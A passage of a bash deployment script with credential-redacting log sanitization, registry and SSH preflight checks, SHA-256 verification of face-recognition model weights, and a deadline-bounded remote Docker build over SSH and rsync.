  _ek='[A-Za-z0-9_]*_(TOKEN|PASSWORD|SECRET|KEY|AUTH|PASSPHRASE|CREDENTIALS|PWD)|[A-Za-z0-9_]*_key_id|[A-Za-z0-9_]*_key_content|[A-Za-z0-9_]*_access_key|secret_key_base|_authtoken|_auth|PGPASSWORD|PASSPHRASE|pass_phrase|CREDENTIALS|TOKEN|PASSWORD|PASSWD|SECRET|KEY|AUTH|PASS'
  _hdr='bearer|basic|token|apikey|api-key|api_key|digest|signature|aws4-hmac-sha256'
  LC_ALL=C LANG=C LC_CTYPE=C tr -d '\000-\010\013-\037\177' \
    | LC_ALL=C LANG=C LC_CTYPE=C awk -v sq="'" '
        function depth_delta(s,    i, c, in_str, esc, d) { d=0; in_str=0; esc=0; for (i=1; i<=length(s); i++) { c=substr(s,i,1); if (in_str) { if (esc) { esc=0; continue } if (c=="\\") { esc=1; continue } if (c=="\"") in_str=0; continue } if (c=="\"") { in_str=1; continue } if (c=="["||c=="{") d++; else if (c=="]"||c=="}") d-- } return d }
        function is_pretty_open(s,    t, pat) { t=tolower(s); if (t ~ /"(token|access_token|refresh_token|password|passwd|secret|apikey|api-key|api_key|[a-z0-9_]*_token|[a-z0-9_]*_password|[a-z0-9_]*_secret|[a-z0-9_]*_key_id|[a-z0-9_]*_key_content|[a-z0-9_]*_access_key|secret_key_base|[a-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth)"[ \t]*[=:]+[ \t]*[\[{][ \t]*$/) return 1; pat=sq "(token|access_token|refresh_token|password|passwd|secret|apikey|api-key|api_key|[a-z0-9_]*_token|[a-z0-9_]*_password|[a-z0-9_]*_secret|[a-z0-9_]*_key_id|[a-z0-9_]*_key_content|[a-z0-9_]*_access_key|secret_key_base|[a-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth)" sq "[ \t]*[=:]+[ \t]*[\[{][ \t]*$"; return (t ~ pat) }
        function pem_begin_end(s) { return (s ~ /-----BEGIN [A-Za-z0-9 ]*PRIVATE KEY-----/ && s ~ /-----END [A-Za-z0-9 ]*PRIVATE KEY-----/) }
        function pem_has_begin(s) { return (s ~ /-----BEGIN [A-Za-z0-9 ]*PRIVATE KEY-----/) }
        function redact_pem_oneline(s,    pre, rest) { match(s, /-----BEGIN [A-Za-z0-9 ]*PRIVATE KEY-----/); pre=substr(s, 1, RSTART+RLENGTH-1); rest=substr(s, RSTART+RLENGTH); match(rest, /-----END [A-Za-z0-9 ]*PRIVATE KEY-----/); return pre " [REDACTED] " substr(rest, RSTART) }
        function redact_pem_prefix(s,    t) { match(s, /-----BEGIN [A-Za-z0-9 ]*PRIVATE KEY-----/); t=substr(s, RSTART+RLENGTH); if (t ~ /^[ \t]*$/) return substr(s, 1, RSTART+RLENGTH-1); return substr(s, 1, RSTART+RLENGTH-1) " [REDACTED]" }
        BEGIN { pem=0; depth=0 }
        { if (pem) { if ($0 ~ /-----END [A-Za-z0-9 ]*PRIVATE KEY-----/) { pem=0; print; next } print "[REDACTED]"; next } if (pem_begin_end($0)) { print redact_pem_oneline($0); next } if (pem_has_begin($0)) { print redact_pem_prefix($0); pem=1; next } if (depth>0) { depth+=depth_delta($0); if (depth<0) depth=0; if ($0 ~ /^[ \t]*[\]},]*[ \t]*$/) print; else print "[REDACTED]"; next } if (is_pretty_open($0)) { depth+=depth_delta($0); print; next } print }
      ' \
    | LC_ALL=C LANG=C LC_CTYPE=C sed -E \
      -e 's/["'"'"']authorization["'"'"'][[:space:]]*:[[:space:]]*"('"${_hdr}"')[[:space:]]+(\\.|[^"\\])*"/"Authorization": "\1 [REDACTED]"/gI' \
      -e "s/[\"']authorization[\"'][[:space:]]*:[[:space:]]*'("${_hdr}")[[:space:]]+(\\\\.|[^'\\\\])*'/\"Authorization\": \"\\1 [REDACTED]\"/gI" \
      -e 's/authorization[[:space:]]*[=:][[:space:]]*('"${_hdr}"')[[:space:]].*/Authorization: \1 [REDACTED]/gI' \
      -e 's/authorization[[:space:]]*[=:][[:space:]]*[^[:space:]]+$/Authorization: [REDACTED]/gI' \
      -e 's/(^|[^[:alnum:]])('"${_hdr}"')[[:space:]]+("[^"]*"|'"'"'[^'"'"']*'"'"'|[^[:space:]"'"'"']{8,})/\1\2 [REDACTED]/gI' \
      -e 's/["'"'"']('"${_sk}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+"(\\.|[^"\\])*"/"\1": "[REDACTED]"/gI' \
      -e 's/["'"'"']('"${_sk}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+'"'"'(\\.|[^'"'"'\\])*'"'"'/"\1": "[REDACTED]"/gI' \
      -e 's/["'"'"']('"${_sk}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+"(\\.|[^"\\])*\\?$/"\1": "[REDACTED]/gI' \
      -e 's/["'"'"']('"${_sk}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+'"'"'(\\.|[^'"'"'\\])*\\?$/"\1": "[REDACTED]/gI' \
      -e 's/["'"'"']('"${_sk}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+(null|true|false)([,}[:space:]]|$)/"\1": '"${_soh}"'\3\4/gI' \
      -e 's/'"${_soh}"'([A-Za-z]*[A-Z][A-Za-z]*)/\1/g' \
      -e 's/["'"'"']('"${_sk}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+[\[{].*$/"\1": [REDACTED]/gI' \
      -e 's/["'"'"']('"${_sk}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+([^[:space:],}"'"'"''"${_soh}"'][^[:space:],}"'"'"']*)/"\1": [REDACTED]/gI' \
      -e 's/(^|[^A-Za-z0-9_-])('"${_ek}"')[[:space:]]*([=:]+>?[[:space:]]*)+"(\\.|[^"\\])*"/\1\2=[REDACTED]/gI' \
      -e "s/(^|[^A-Za-z0-9_-])(${_ek})[[:space:]]*([=:]+>?[[:space:]]*)+'[^']*'/\1\2=[REDACTED]/gI" \
      -e 's/(^|[^A-Za-z0-9_-])('"${_ek}"')[[:space:]]*([=:]+>?[[:space:]]*)+[^[:space:]]+/\1\2=[REDACTED]/gI' \
      -e 's/(^|[[:space:]])--([A-Za-z0-9_-]*(password|passwd|token|secret|key))[=:][^[:space:]]+/\1--\2=[REDACTED]/gI' \
      -e 's/(^|[[:space:]])--([A-Za-z0-9_-]*(password|passwd|token|secret|key))[[:space:]]+[^[:space:]]+/\1--\2 [REDACTED]/gI' \
      -e 's/(^|[^[:alnum:]])([A-Za-z0-9-]*-(token|secret|key))[[:space:]]*:[[:space:]]*[^[:space:]]+/\1\2: [REDACTED]/gI' \
      -e 's/(^|[^A-Za-z0-9_])([A-Za-z0-9_-]*(api_key|api-key|apikey))[[:space:]]*:[[:space:]]*[^[:space:]"]+/\1\2: [REDACTED]/gI' \
      -e 's/(^|[^A-Za-z0-9_])(api_key|api-key|apikey)[[:space:]]*=[[:space:]]*("[^"]*"|'\''[^'\'']*'\''|[^[:space:]&"]+)/\1\2=[REDACTED]/gI' \
      -e 's|://([^:/@[:space:]]*):([^[:space:]/]+)@([[:alnum:]._-]+)|://\1:[REDACTED]@\3|g' \
      -e 's|://([^:/@[:space:]]*):([^[:space:]/@]+)@|://\1:[REDACTED]@|g' \
      -e 's/[Cc]ookie:[[:space:]].*/Cookie: [REDACTED]/' \
      -e 's/ghp_[A-Za-z0-9]{20,}/[REDACTED]/g' \
      -e 's/github_pat_[A-Za-z0-9_]{10,}/[REDACTED]/g' \
      -e 's/AKIA[A-Z0-9]{16}/[REDACTED]/g' \
      -e 's/'"${_soh}"'//g' \
    | LC_ALL=C LANG=C LC_CTYPE=C sed 's/^/diagnostic: /'
}

# Prefix-and-redact one evidence blob onto deploy stderr. Hoisted so
# capture_failure_evidence does not redefine it on every call (C-05).
emit_sanitized_evidence() {
  local blob="$1"
  [[ -n "${blob}" ]] || return 0
  if ! printf '%s\n' "${blob}" | sanitize_deploy_diagnostic >&2; then
    echo "diagnostic: evidence unavailable" >&2
  fi
}

# Release It! 5.5 (Fail Fast): verify the credential we will actually use, before
# the build burns minutes. The old form only checked that *some* entry for the
# registry existed in ~/.docker/config.json -- a credential revoked upstream
# still looked healthy here and failed at push, which is exactly the "the one
# resource nobody checked is where it fails late" trap.
#
# The new form performs the real login against a freshly fetched Vault token in
# the deploy-scoped DOCKER_CONFIG subsequently used by push and pull. A green
# preflight guarantees that those later processes receive the authenticated
# config; registry-side rejection can still occur after the preflight.
ocir_login_or_fail() {
  local scope="$1" out rc=0
  shift
  out="$("$@" 2>&1)" || rc=$?
  if [[ "$rc" -ne 0 ]]; then
    local class hint
    class="$(ocir_classify_login_failure "$out")"
    hint="$(ocir_login_failure_hint "$class")"
    warn "OCIR login failed on ${scope} [${class}]: ${hint}"
    warn "Sanitized upstream diagnostic follows"
    # The token never appears in $out -- it only ever transits a pipe -- but the
    # OCI CLI echoes request context, so keep this on stderr rather than in a
    # deploy log that gets pasted around.
    if ! printf '%s\n' "$out" | sanitize_deploy_diagnostic >&2; then
      echo "diagnostic: OCIR login diagnostic unavailable" >&2
    fi
    fail "OCIR auth unavailable (${scope}, ${class})"
  fi
  log "OCIR authenticated on ${scope} via acx-vault/${ACX_OCIR_TOKEN_SECRET}"
}

preflight_ocir_auth() {
  local snippet
  init_deploy_ocir_docker_config
  snippet="$(ocir_login_snippet "${ACX_LOCAL_OCI_BIN}" api_key "${OCIR_REGISTRY}")"
  ocir_login_or_fail "laptop" bash -c "$snippet"
}
preflight_ssh() {
  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" 'echo ok' >/dev/null 2>&1; then
    warn "SSH to ${SSH_TARGET} failed (check ssh-add, public-IP allowlist, key path, tailnet status)."
    fail "SSH unavailable"
  fi
}
preflight_remote_docker() {
  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" 'docker info >/dev/null 2>&1'; then
    fail "docker not running (or user lacks docker group) on ${SSH_TARGET}"
  fi
}
preflight_remote_ocir_auth() {
  # ACX_REMOTE_OCI_BIN carries a literal $HOME for the remote shell to expand, so
  # the snippet is fed to `bash -s` over stdin rather than interpolated into
  # argv. The here-string binds to the function call; ssh inherits that stdin.
  local snippet
  if [[ "${ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED}" == "1" ]]; then
    return 0
  fi
  init_remote_ocir_docker_config
  snippet="$(ocir_login_snippet "${ACX_REMOTE_OCI_BIN}" instance_principal "${OCIR_REGISTRY}")"
  ocir_login_or_fail "${SSH_TARGET}" \
    ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
      'bash -s' <<<"$snippet"
  ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=1
}
preflight_rsync() {
  command -v rsync >/dev/null 2>&1 || fail "rsync not found in PATH (required for remote-build mode)"
}
preflight_git_clean() {
  local env="$1"
  # dev-fir is a dev-tier env (feature-branch workflow): same dirty-tree policy as dev.
  if ! git -C "${REPO_ROOT}" diff --quiet HEAD -- 2>/dev/null \
     || [[ -n "$(git -C "${REPO_ROOT}" status --porcelain --untracked-files=no 2>/dev/null)" ]]; then
    if [[ "$env" == "dev" || "$env" == "dev-fir" ]] && [[ "${ACX_ALLOW_DIRTY:-0}" == "1" ]]; then
      warn "Working tree is dirty (ACX_ALLOW_DIRTY=1, continuing for ${env})."
    elif [[ "$env" == "dev" || "$env" == "dev-fir" ]]; then
      warn "Working tree is dirty. Re-run with ACX_ALLOW_DIRTY=1 to override."
      fail "dirty tree (${env})"
    else
      fail "Working tree must be clean for ${env} deploys."
    fi
  fi
}
preflight_branch_synced() {
  local env="$1"
  # dev + dev-fir are developed from feature branches; skip origin/main sync.
  [[ "$env" == "dev" || "$env" == "dev-fir" ]] && return 0
  local head upstream
  head="$(git -C "${REPO_ROOT}" rev-parse HEAD)"
  git -C "${REPO_ROOT}" fetch origin main >/dev/null 2>&1 || warn "git fetch failed; skew check may be stale"
  upstream="$(git -C "${REPO_ROOT}" rev-parse origin/main 2>/dev/null || echo unknown)"
  if [[ "$head" != "$upstream" ]]; then
    fail "HEAD (${head:0:8}) != origin/main (${upstream:0:8}). Pull/push first."
  fi
}

# FIR stack shares the :dev image and volume-mounts YuNet+SFace ONNX (not baked
# in; rsync excludes them). Deploy/promote/reset must fail closed if the host
# volume is empty or the bytes do not match the sha256 pins in
# recognition/infrastructure/face_pipeline/provenance.py MODEL_MANIFEST.
# Format: filename:sha256 (hex). Keep in lockstep with MODEL_MANIFEST.
FACE_PIPELINE_ONNX_SHA256=(
  "face_detection_yunet_2026may.onnx:ebafce4e3c118d6554634be5c27ab333b4c047a9a8c3faf1d7cf93101c22f0f0"
  "face_recognition_sface_2021dec.onnx:0ba9fbfa01b5270c96627c4ef784da859931e02f04419c829e83484087c34e79"
)

# sha256 of a local file. sha256sum is Linux/macOS-15+; older macOS only has
# shasum. verify_face_pipeline_models_dir inlines the same fallback on purpose —
# it is shipped to the remote via declare -f and must stay self-contained.
_local_sha256() {
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  else
    shasum -a 256 "$1" | awk '{print $1}'
  fi
}

# Host-local integrity check for face_pipeline ONNX weights (C-07 extractable body).
# Args: models_dir. Prints OK on success; DIR_FAIL:/FILE_FAIL:/HASH_FAIL: + exit 1 otherwise.
# Sourced by tests and shipped to the remote via declare -f for preflight.
verify_face_pipeline_models_dir() {
  local models_dir="${1:?models_dir required}"
  local entry f expected actual
  if [[ ! -d "${models_dir}" ]] || [[ ! -r "${models_dir}" ]]; then
    echo "DIR_FAIL:${models_dir}"
    return 1
  fi
  for entry in "${FACE_PIPELINE_ONNX_SHA256[@]}"; do
    f="${entry%%:*}"
    expected="${entry#*:}"
    if [[ ! -f "${models_dir}/${f}" ]] || [[ ! -r "${models_dir}/${f}" ]]; then
      echo "FILE_FAIL:${f}:${models_dir}"
      return 1
    fi
    # Prefer sha256sum (Linux); fall back to shasum -a 256 (macOS).
    if command -v sha256sum >/dev/null 2>&1; then
      actual="$(sha256sum "${models_dir}/${f}" | awk '{print $1}')"
    else
      actual="$(shasum -a 256 "${models_dir}/${f}" | awk '{print $1}')"
    fi
    if [[ "${actual}" != "${expected}" ]]; then
      echo "HASH_FAIL:${f}:${models_dir}:expected=${expected}:actual=${actual}"
      return 1
    fi
  done
  echo OK
  return 0
}

# Read KEY=VALUE from remote_dir/.env. Value is taken verbatim to end-of-line
# after the first '=' (C-05); one matching pair of surrounding quotes is stripped.
# Missing key → empty string (exit 0). SSH failure → fail closed (C-06).
_remote_dotenv_value() {
  local remote_dir="$1" key="$2" raw rc=0
  # Remote `|| true` only covers a missing key / missing file (grep exit 1).
  # Local ssh failure is NOT swallowed.
  raw="$(ssh -o BatchMode=yes -o ConnectTimeout=5 "${SSH_TARGET}" \
    "grep -E '^${key}=' '${remote_dir}/.env' 2>/dev/null | tail -1 | cut -d= -f2- || true")" || rc=$?
  if (( rc != 0 )); then
    fail "ssh failed reading ${key} from ${remote_dir}/.env on ${SSH_TARGET} (exit ${rc})"
  fi
  # Strip one layer of surrounding double or single quotes only.
  if [[ ${#raw} -ge 2 && "${raw}" == \"*\" ]]; then
    raw="${raw:1:${#raw}-2}"
  elif [[ ${#raw} -ge 2 && "${raw}" == \'*\' ]]; then
    raw="${raw:1:${#raw}-2}"
  fi
  printf '%s' "$raw"
}

preflight_remote_face_pipeline_models() {
  local env="$1"
  # Only dev-fir uses the face_pipeline profile with host-mounted weights.
  [[ "$env" == "dev-fir" ]] || return 0

  local remote_dir models_dir_cfg models_path models_dir remote_out remote_rc=0
  remote_dir="$(env_to_remote_dir "$env")"

  # Authoritative models dir is RECOGNITION_FACE_PIPELINE_MODELS_DIR [sr-007] (C-10).
  # When it is the in-container path under the compose mount
  # (${ACX_MODELS_PATH}:/data/cache), map to the host volume root for the check.
  models_dir_cfg="$(_remote_dotenv_value "$remote_dir" RECOGNITION_FACE_PIPELINE_MODELS_DIR)"
  if [[ -z "${models_dir_cfg}" ]]; then
    fail "RECOGNITION_FACE_PIPELINE_MODELS_DIR missing or unreadable in ${remote_dir}/.env on ${SSH_TARGET}; cannot verify face_pipeline models"
  fi
  if [[ "${models_dir_cfg}" == /data/cache || "${models_dir_cfg}" == /data/cache/* ]]; then
    models_path="$(_remote_dotenv_value "$remote_dir" ACX_MODELS_PATH)"
    if [[ -z "${models_path}" ]]; then
      fail "ACX_MODELS_PATH missing or unreadable in ${remote_dir}/.env on ${SSH_TARGET}; cannot map RECOGNITION_FACE_PIPELINE_MODELS_DIR=${models_dir_cfg} to host path"
    fi
    models_dir="${models_path}${models_dir_cfg#/data/cache}"
  else
    # The container only mounts ${ACX_MODELS_PATH}:/data/cache. A models dir
    # outside /data/cache may verify fine on the host yet be invisible to the
    # container at runtime — fail closed instead of green-lighting an
    # unloadable config (gate r0811864a B-02).
    fail "RECOGNITION_FACE_PIPELINE_MODELS_DIR=${models_dir_cfg} is outside the container mount /data/cache; the api container cannot load models from host-only paths. Set it to /data/cache[/subdir] in ${remote_dir}/.env"
  fi

  # Ship the extractable verify body to the remote and execute it (C-07/C-11).
  # Capture stdout even when the remote check exits non-zero; do not swallow
  # unrelated ssh failures with `|| true` (C-06).
  remote_out="$(ssh -o BatchMode=yes -o ConnectTimeout=5 "${SSH_TARGET}" \
    "bash -s" <<REMOTE
set -euo pipefail
$(declare -p FACE_PIPELINE_ONNX_SHA256)
$(declare -f verify_face_pipeline_models_dir)
verify_face_pipeline_models_dir $(printf '%q' "${models_dir}")
REMOTE
)" || remote_rc=$?

  if [[ "${remote_out}" == "OK" && "${remote_rc}" -eq 0 ]]; then
    log "face_pipeline ONNX weights present and sha256-verified under ${models_dir}"
    return 0
  fi
  if [[ "${remote_out}" == DIR_FAIL:* ]]; then
    fail "face_pipeline models directory missing or unreadable: ${remote_out#DIR_FAIL:} on ${SSH_TARGET}"
  fi
  if [[ "${remote_out}" == FILE_FAIL:* ]]; then
    local miss_file miss_dir
    miss_file="$(printf '%s' "${remote_out#FILE_FAIL:}" | cut -d: -f1)"
    miss_dir="$(printf '%s' "${remote_out#FILE_FAIL:}" | cut -d: -f2-)"
    fail "missing face_pipeline ONNX weight ${miss_file} under ${miss_dir} on ${SSH_TARGET}"
  fi
  if [[ "${remote_out}" == HASH_FAIL:* ]]; then
    fail "face_pipeline ONNX integrity check failed (${remote_out}) on ${SSH_TARGET}"
  fi
  if (( remote_rc != 0 )); then
    fail "face_pipeline models preflight ssh/remote failed for ${env} (exit ${remote_rc}, looked under ${models_dir} on ${SSH_TARGET}): ${remote_out:-no remote response}"
  fi
  fail "face_pipeline models preflight failed for ${env} (looked under ${models_dir} on ${SSH_TARGET}): ${remote_out:-no remote response}"
}

#---------------------------------------------------------------- build
# Optional --target flag from ACX_BUILD_TARGET (empty = last stage).
_build_target_args() {
  if [[ -n "${ACX_BUILD_TARGET}" ]]; then
    assert_safe_shell_token "ACX_BUILD_TARGET" "${ACX_BUILD_TARGET}"
    printf -- '--target %s' "${ACX_BUILD_TARGET}"
  fi
}

remote_build_remaining() {
  local phase="${1:-remote BuildKit phase}" elapsed remaining
  elapsed=$((SECONDS - remote_build_started))
  remaining=$((remote_build_timeout - elapsed))
  if (( remaining < 1 )); then
    warn "Remote build budget exhausted before ${phase}"
    return 1
  fi
  printf '%s\n' "${remaining}"
}

remote_build_phase_timeout() {
  local phase="$1" cap="$2" remaining
  remaining="$(remote_build_remaining "${phase}")" || return
  if (( remaining > cap )); then
    remaining="${cap}"
  fi
  printf '%s\n' "${remaining}"
}

remote_build_cleanup_generation() {
  local build_dir="$1" command_timeout="$2" cleanup_timeout
  if cleanup_timeout="$(remote_build_phase_timeout "remote generation directory cleanup" "${command_timeout}")"; then
    run_with_deadline "${cleanup_timeout}" "remote generation directory cleanup" \
      ssh -l "${OCI_USER}" -- "${OCI_HOST}" "rm -rf -- '$(remote_quote "${build_dir}")'" \
      || warn "Could not clean remote generation directory ${build_dir}"
  else
    warn "Remote build budget exhausted; generation directory may remain: ${build_dir}"
  fi
}

do_build() {
  preflight_docker
  local sha tag target_args
  sha="$(git -C "${REPO_ROOT}" rev-parse "${GIT_REF}")"
  tag="${1:-dev}"
  assert_safe_shell_token "image tag" "${tag}"
  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
  target_args="$(_build_target_args)"
  log "Building ${IMAGE_BASE}:${tag} + :${sha:0:8} (${PLATFORM}, GIT_COMMIT_SHA=${sha:0:8}${ACX_BUILD_TARGET:+, target=${ACX_BUILD_TARGET}})"
  cd "${SERVICE_DIR}"
  # shellcheck disable=SC2086 # target_args is intentionally word-split (empty or "--target X")
  docker build \
    --platform "${PLATFORM}" \
    --build-arg "GIT_COMMIT_SHA=${sha}" \
    ${target_args} \
    -t "${IMAGE_BASE}:${tag}" \
    -t "${IMAGE_BASE}:${sha}" \
    .
  log "Built ${IMAGE_BASE}:${tag} (also tagged :${sha:0:8})"
}

do_build_remote() {
  preflight_ssh
  preflight_remote_docker
  preflight_rsync
  local sha tag build_dir build_timeout command_timeout build_rc=0 rsync_rc=0
  local remote_build_started remote_build_timeout
  local free_space_timeout mkdir_timeout rsync_timeout remaining
  local remote_program remote_command remote_arg
  sha="$(git -C "${REPO_ROOT}" rev-parse "${GIT_REF}")"
  tag="${1:-dev}"
  assert_safe_shell_token "image tag" "${tag}"
  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
  build_timeout="$(validated_deadline ACX_REMOTE_BUILD_TIMEOUT 1800)"
  command_timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
  remote_build_started="${SECONDS}"
  remote_build_timeout="${build_timeout}"
  # A unique generation directory prevents one coordinator's --delete rsync
  # from rewriting another coordinator's source tree. flock additionally
  # serializes builder setup, bootstrap, prune, and the resource-heavy BuildKit
  # phase on the production-serving VM.
  build_dir="${REMOTE_BUILD_DIR%/}-${sha:0:12}-$(date +%s)-${BASHPID:-$$}-${RANDOM}"
  assert_safe_shell_token "remote generation build directory" "${build_dir}"

  # All pre-build remote calls consume the same ACX_REMOTE_BUILD_TIMEOUT
  # budget; command_timeout is only a per-call cap for lightweight setup.
  if ! free_space_timeout="$(remote_build_phase_timeout "remote docker free-space probe" "${command_timeout}")"; then
    fail "Remote build budget exhausted before the free-space probe"
  fi
  assert_remote_build_free_space "${free_space_timeout}"

  log "Syncing build context ${SERVICE_DIR}/ -> ${SSH_TARGET}:${build_dir}/"
  # D1: REMOTE_BUILD_DIR is charset-validated at ingestion; still single-quote at the sink so a
  # future allowlist slip cannot unquote into remote argv (same blast radius as ACX_BUILD_TARGET).
  if ! mkdir_timeout="$(remote_build_phase_timeout "remote generation directory creation" "${command_timeout}")"; then
    fail "Remote build budget exhausted before generation directory creation"
  fi
  run_with_deadline "${mkdir_timeout}" "remote generation directory creation" \
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "mkdir -p -- '$(remote_quote "${build_dir}")'" \
    || build_rc=$?
  if (( build_rc != 0 )); then
    remote_build_cleanup_generation "${build_dir}" "${command_timeout}"
    return "${build_rc}"
  fi
  # Weight-artifact excludes must stay in lockstep with apps/prototype-description-service/.dockerignore
  # (see test_dockerignore_weight_exclusions.py). This list does NOT read .dockerignore.
  #
  # WHY (rsync glob-depth rule — do NOT "fix" by adding **/):
  #   rsync: a pattern with no `/` (except an optional trailing `/` for "directory only")
  #   matches the basename at every depth. `models--*/` therefore excludes both a top-level
  #   models--Qwen.../ and one ten levels down. Prefixing `**/` injects a slash and switches
  #   the rule to full-path matching; that is the opposite of Docker .dockerignore, where
  #   `*.bin` is root-anchored and `**/*.bin` is the recursive form. Never add `**/` here.
  if rsync_timeout="$(remote_build_phase_timeout "remote build-context rsync" "${build_timeout}")"; then
    run_with_deadline "${rsync_timeout}" "remote build-context rsync" rsync -az --delete \
    --exclude='.git/' \
    --exclude='__pycache__/' \
    --exclude='*.pyc' \
    --exclude='.pytest_cache/' \
    --exclude='.mypy_cache/' \
    --exclude='.ruff_cache/' \
    --exclude='.venv/' \
    --exclude='*.egg-info/' \
    --exclude='build/' \
    --exclude='dist/' \
    --exclude='data/' \
    --exclude='logs/' \
    --exclude='node_modules/' \
    --exclude='recognition/infrastructure/face_pipeline/models/*.onnx' \
    --exclude='*.safetensors' \
    --exclude='*.bin' \
    --exclude='*.pt' \
    --exclude='*.pth' \
    --exclude='*.gguf' \
    --exclude='*.msgpack' \
    --exclude='models--*/' \
    "${SERVICE_DIR}/" "${SSH_TARGET}:${build_dir}/" || rsync_rc=$?
  else
    rsync_rc=1
  fi
  if (( rsync_rc != 0 )); then
    remote_build_cleanup_generation "${build_dir}" "${command_timeout}"
    return "${rsync_rc}"
  fi

  log "Building ${IMAGE_BASE}:${sha} on ${SSH_TARGET} for ${tag} (native arm64${ACX_BUILD_TARGET:+, target=${ACX_BUILD_TARGET}})"
  # No --platform: VM is already linux/arm64 (Ampere A1).
  # The generated program performs builder setup, bootstrap, verification,
  # prune, and build beneath one shared lock. Its stdin is the program itself;
  # run_with_deadline preserves that stdin while it backgrounds ssh.
  remote_program="$(bounded_remote_build_program)"
  if ! remaining="$(remote_build_remaining "remote BuildKit setup/bootstrap/prune/build")"; then
    remote_build_cleanup_generation "${build_dir}" "${command_timeout}"
    fail "Remote build budget exhausted before the locked BuildKit phase"
  fi
  # Establish the absolute deadline on the VM immediately before lock wait so
  # local/remote clock skew cannot make the inner watchdog either too short or
  # longer than the remaining local budget.
  remote_command="command -v flock >/dev/null 2>&1 && acx_deadline_epoch=\$(date +%s) && acx_deadline_epoch=\$((acx_deadline_epoch + ${remaining})) && flock -w ${remaining} $(remote_quote "${REMOTE_BUILD_LOCK}") bash -s --"
  for remote_arg in "${REMOTE_BUILDER_NAME}" "${REMOTE_BUILDER_NODE}" "${REMOTE_BUILDER_ENDPOINT}" \
    "${IMAGE_BASE}" "${sha}" "${ACX_BUILD_TARGET}"; do
    remote_command+=" $(remote_quote "${remote_arg}")"
  done
  remote_command+=' "$acx_deadline_epoch"'
  remote_command+=" $(remote_quote "${build_dir}")"
  run_with_deadline "${remaining}" "remote BuildKit setup/bootstrap/prune/build for ${sha:0:12}" \
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "${remote_command}" \
    <<<"${remote_program}" || build_rc=$?
  remote_build_cleanup_generation "${build_dir}" "${command_timeout}"
  (( build_rc == 0 )) || return "${build_rc}"
  log "Built ${IMAGE_BASE}:${sha} on ${SSH_TARGET}; environment tag awaits promotion"
}

#---------------------------------------------------------------- push / restart
# Run a command with a portable outer wall-clock deadline.  This intentionally
# does not rely on GNU timeout(1), which is absent on a stock macOS workstation.
terminate_process_tree() {
  local root_pid="$1" signal_name="$2" child_pid
  while read -r child_pid; do
    [[ -n "${child_pid}" ]] || continue
    terminate_process_tree "${child_pid}" "${signal_name}"
  done < <(ps -eo pid=,ppid= | awk -v parent="${root_pid}" '$2 == parent { print $1 }')
  kill -s "${signal_name}" "${root_pid}" 2>/dev/null || true
}

run_with_deadline() {
  local deadline="$1" label="$2" pid rc owner_pid current_parent process_state started_at
  # BASHPID is bash 4.0+; macOS operators run this from /bin/bash 3.2. A child
  # that execs sh reports the forking shell as its PPID, which is this shell.
  owner_pid="${BASHPID:-$(exec sh -c 'echo $PPID')}"
  shift 2
  # A job backgrounded by a non-interactive shell inherits /dev/null on stdin,
  # which silently swallows any heredoc/here-string the caller attached — e.g.
  # do_boot_smoke's SMOKE script piped to `ssh ... bash -s`, where an empty stdin
  # makes the remote shell exit 0 without running a single gate (fail-open smoke).
  # WHY `<&0`: without job control a bare `cmd &` gets /dev/null as stdin, which
  # would starve callers that attach a heredoc (do_boot_smoke's `ssh ... bash -s`).
  # Do NOT reintroduce `exec 3<&0; cmd <&3 &; exec 3<&-`: bash 5.2 segfaults
  # (rc 139, no diagnostic) on that dup/close pair inside a command substitution
  # when the program arrives over `bash -s` — the shape capture_failure_evidence
  # uses for every `evidence="$(run_with_deadline ...)"` probe.
  "$@" <&0 &
  pid=$!
  started_at="${SECONDS}"
  while kill -0 "${pid}" 2>/dev/null; do
    # kill -0 also succeeds for an exited-but-unreaped zombie. Detect that
    # state so every healthy integration does not pay a one-second poll tax.
    process_state="$(ps -o stat= -p "${pid}" 2>/dev/null | tr -d ' ' || true)"
    if [[ -z "${process_state}" || "${process_state}" == Z* ]]; then
      break
    fi
    if (( SECONDS - started_at >= deadline )); then
      terminate_process_tree "${pid}" TERM
      sleep 1
      current_parent="$(ps -o ppid= -p "${pid}" 2>/dev/null | tr -d ' ' || true)"
      if [[ "${current_parent}" == "${owner_pid}" ]]; then
        terminate_process_tree "${pid}" KILL
      fi
      wait "${pid}" 2>/dev/null || true
      warn "${label} timed out after ${deadline}s; outcome UNKNOWN. Inspect the target state before retrying."
      return 124
    fi
    sleep 0.1
  done
  wait "${pid}" || { rc=$?; return "${rc}"; }
}

validated_deadline() {
  local name="$1" default_value="$2" value
  value="${!name:-${default_value}}"
  if [[ ! "${value}" =~ ^[1-9][0-9]*$ ]]; then
    fail "${name} must be a positive integer (got: ${value})"
  fi
  printf '%s\n' "${value}"
}

# Keep the credential-store path out of unrelated children (git, ssh, rsync,
# build tooling). Only registry-facing local Docker commands receive it.
local_docker_with_config() {
  DOCKER_CONFIG="${ACX_DEPLOY_OCIR_CONFIG_DIR}" \
    ACX_OCIR_DOCKER_CONFIG_DIR="${ACX_DEPLOY_OCIR_CONFIG_DIR}" \
    docker "$@"
}

remote_docker_with_config() {
  local config_q arg quoted_args=""
  config_q="$(remote_quote "${ACX_DEPLOY_OCIR_CONFIG_DIR}")"
  for arg in "$@"; do
